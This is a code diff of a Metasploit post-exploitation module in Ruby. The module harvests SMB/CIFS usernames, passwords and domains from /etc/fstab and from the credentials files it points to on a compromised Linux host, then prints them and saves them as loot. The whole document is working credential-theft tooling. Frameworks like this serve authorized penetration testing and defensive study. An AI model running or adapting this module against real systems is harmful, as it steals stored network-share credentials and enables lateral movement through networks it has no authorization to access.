@@ -9,8 +9,8 @@ class Metasploit3 < Msf::Post
 
 	def initialize(info={})
 		super( update_info( info,
-				'Name'          => 'Linux Gather credentials saved for mount.smbfs',
-				'Description'   => %q{Post Module to obtain credentials saved for mount.smbfs in /etc/fstab on a Linux system},
+				'Name'          => 'Linux Gather credentials saved for mount.cifs/mount.smbfs',
+				'Description'   => %q{Post Module to obtain credentials saved for mount.cifs/mount.smbfs in /etc/fstab on a Linux system},
 				'License'       => MSF_LICENSE,
 				'Author'        => [ 'Jon Hart <jhart[at]spoofed.org>'],
 				'Platform'      => [ 'linux' ],
@@ -21,8 +21,25 @@ class Metasploit3 < Msf::Post
 	def run
 		# keep track of any of the credentials files we read so we only read them once
 		cred_files = []
+		# where we'll store hashes of found credentials while parsing.  reporting is done at the end.
+		creds = []
+		# A table to store the found credentials for loot storage afterward
+		cred_table = Rex::Ui::Text::Table.new(
+		'Header'    => "mount.cifs credentials",
+		'Indent'    => 1,
+		'Columns'   =>
+		[
+			"Username",
+			"Password",
+			"Server",
+			"File"
+		])
+
+		# parse each line from /etc/fstab
 		read_file("/etc/fstab").each_line do |fstab_line|
 			fstab_line.strip!
+			# where we'll store the current parsed credentials, if any
+			cred = {}
 			# if the fstab line utilizies the credentials= option, read the credentials from that file
 			if (fstab_line =~ /\/\/([^\/]+)\/\S+\s+\S+\s+cifs\s+.*/)
 				host = $1
@@ -36,19 +53,37 @@ class Metasploit3 < Msf::Post
 					# store it if we haven't
 					cred_files << file
 					# parse the credentials
-					auth = parse_credentials_file(file)
-					# report
-					report_cifscreds(host, auth, file)
+					creds << parse_credentials_file(file)
 				# if the credentials are directly in /etc/fstab, parse them
 				elsif (fstab_line =~ /\/\/([^\/]+)\/\S+\s+\S+\s+cifs\s+.*(?:user(?:name)?|pass(?:word)?)=/)
-					auth = parse_fstab_credentials(fstab_line)
-					report_cifscreds(host, auth, "/etc/fstab")
+					creds <<  parse_fstab_credentials(fstab_line)
 				end
 			end
 		end
+
+		# all done.  clean up, report and loot.
+		creds.flatten!
+		creds.compact!
+		creds.uniq!
+		creds.each do |cred|
+			# XXX: currently, you can only report_auth_info on an IP or a valid Host.  in our case,
+			# host[:host] is *not* a Host.  Fix this some day.
+			if (Rex::Socket.dotted_ip?(cred[:host]))
+				report_auth_info({ :port => 445, :sname => 'smb', :type => 'password', :active => true }.merge(cred))
+			end
+			cred_table << [ cred[:user], cred[:pass], cred[:host], cred[:file] ]
+			print_good("SMB credentials: user=#{cred[:user]}, pass=#{cred[:pass]}, host=#{cred[:host]} from #{cred[:file]}")
+		end
+
+		# store all found credentials
+		unless (creds.empty?)
+			store_loot("mount.cifs.creds", "text/csv", session, cred_table.to_csv, "mount_cifs_credentials.txt", "mount.cifs credentials")
+		end
 	end
 
-	def parse_fstab_credentials(line)
+	# Parse mount.cifs credentials from +line+, assumed to be a line from /etc/fstab.
+	# Returns the username+domain and password as a hash, nil if nothing is found.
+	def parse_fstab_credentials(line, file="/etc/fstab")
 		creds = {}
 		# get the username option, which comes in one of four ways
 		user_opt = $1 if (line =~ /user(?:name)?=([^, ]+)/)
@@ -75,9 +110,12 @@ class Metasploit3 < Msf::Post
 		# get the domain option, if any
 		creds[:user] = "#{$1}\\#{creds[:user]}" if (line =~ /dom(?:ain)?=([^, ]+)/)
 
-		creds
+		creds[:file] = file unless (creds.empty?)
+		(creds.empty? ? nil : creds)
 	end
 
+	# Parse mount.cifs credentials from +file+, returning the username+domain and password
+	# as a hash, nil if nothing is found.
 	def parse_credentials_file(file)
 		creds = {}
 		domain = nil
@@ -93,23 +131,8 @@ class Metasploit3 < Msf::Post
 		end
 		# prepend the domain if one was found
 		creds[:user] = "#{domain}\\#{creds[:user]}" if (domain and creds[:user])
+		creds[:file] = file unless (creds.empty?)
 
-		creds
-	end
-
-	# Report SMB auth info +auth+ for +host+ found in +file+
-	def report_cifscreds(host, auth, file)
-		# report if we found something
-		if (auth[:user] or auth[:pass])
-			auth = {
-				:host => host,
-				:port => 445,
-				:sname => 'smb',
-				:type => 'password',
-				:active => true
-			}.merge(auth)
-			report_auth_info(auth)
-			print_good("SMB credentials: user=#{auth[:user]}, pass=#{auth[:pass]}, host=#{auth[:host]} from #{file}")
-		end
+		(creds.empty? ? nil : creds)
 	end
 end
